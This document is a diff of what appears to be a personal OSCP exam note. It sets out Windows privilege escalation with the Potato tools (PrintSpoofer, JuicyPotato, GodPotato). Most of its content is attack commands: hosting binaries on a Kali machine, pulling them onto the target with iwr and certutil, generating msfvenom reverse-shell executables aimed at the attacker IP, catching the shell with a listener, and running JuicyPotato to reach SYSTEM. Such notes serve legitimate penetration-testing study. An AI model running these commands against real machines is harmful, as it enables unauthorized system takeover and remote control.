@@ -4,16 +4,19 @@ Before dropping a payload, you need to know whether the target is 32-bit or 64-b
 
 Run these two commands in your shell:
 
-DOS
-
-```
+```powershell
 powershell [Environment]::Is64BitOperatingSystem
 ```
+
+CMD
 
 ```
 systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
 ```
 
+```
+wmic os get osarchitecture
+```
 ## Step 2: Choose Your Exploit Tool
 
 Depending on the Windows version you discovered in Step 1, select your tool from the **"Potato" family**:
@@ -36,23 +39,26 @@ Depending on the Windows version you discovered in Step 1, select your tool from
 
 Use your Kali machine to host the binary, and pull it down via your active Windows shell using PowerShell's native file transfer capabilities.
 
-1. **On your Kali Machine:** (Navigate to where your exploit is stored and start a web server)
-    
-    Bash
-    
-    ```
-    python3 -m http.server 80
-    ```
-    
-2. **On the Target Windows Machine:** (Download the binary to a writable directory like `C:\Windows\Tasks` or `C:\Users\Public`)
-    
-    PowerShell
-    
-    ```
-    powershell -ep bypass
-    iwr -uri http://<YOUR_KALI_IP>/PrintSpoofer64.exe -OutFile C:\Windows\Tasks\PrintSpoofer.exe
-    ```
-    
+```
+ cd ~/Desktop/Tools && python3 -m http.server 80
+```
+
+POWERSHELL
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+
+const command = ` iwr -uri http://${KaliIP}/PrintSpoofer64.exe -OutFile C:\Windows\Tasks\PrintSpoofer.exe`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+OR
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+
+const command = `certutil.exe -urlcache -split -f http://${KaliIP}/JuicyPotato.exe C:\Windows\Tasks\JuicyPotato.exe`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
 
 ## Step 4: Execute and Escalate
 
@@ -77,10 +83,68 @@ C:\Windows\Tasks\PrintSpoofer.exe -i -c cmd
 
 If you are using a variation that requires triggering a reverse shell back to you, generate an unencoded payload or executable using `msfvenom` or a simple PowerShell one-liner, start a second Netcat listener on Kali, and run:
 
-DOS
+On PANE1
+```
+cd ~/Desktop/Tools && python3 penelope.py -p 9768 -O / --oscp-safe
+```
+ON PANE2 
+
+(x32)
+```
+wget https://github.com/ivanitlearning/Juicy-Potato-x86/releases/download/1.2/Juicy.Potato.x86.exe -O JuicyPotatox32.exe
+```
+
+ (x64)
+```
+wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
+```
+
+MSFVENOM
+
+(x32)
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+
+const command = `msfvenom -p windows/shell_reverse_tcp LHOST=${KaliIP} LPORT=9768 -f exe -o shell.exe`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+(x64)
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+
+const command = `msfvenom -p windows/x64/shell_reverse_tcp LHOST=${KaliIP} LPORT=9768 -f exe -o shell.exe`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+```
+python3 -m http.server 80
+```
+
+ON WINDOWS MACHINE
 
 ```
-C:\Windows\Tasks\GodPotato.exe -cmd "C:\Windows\Tasks\reverse_shell.exe"
+cd C:\Windows\Tasks
+```
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+
+const command = `certutil.exe -urlcache -split -f http://${KaliIP}/shell.exe C:\\\Windows\\\Tasks\\\shell.exe`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+Modify JuicyPotato or JuicyPotatox32.exe
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+
+const command = `certutil.exe -urlcache -split -f http://${KaliIP}/JuicyPotato.exe C:\\\Windows\\\Tasks\\\JuicyPotato.exe`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+Now you execute JuicyPotato. You must feed it the path to your payload (`-p`), a unique CLSID (a COM server ID string), and a local port to bound to (`-l`).
+
+```
+C:\Windows\Tasks\JuicyPotato.exe -t * -p C:\Windows\Tasks\shell.exe -l 9768 -c "{4991d34b-80a1-4291-83b6-3328366b9097}
 ```
 
 ## Step 5: Verify Your Sovereignty
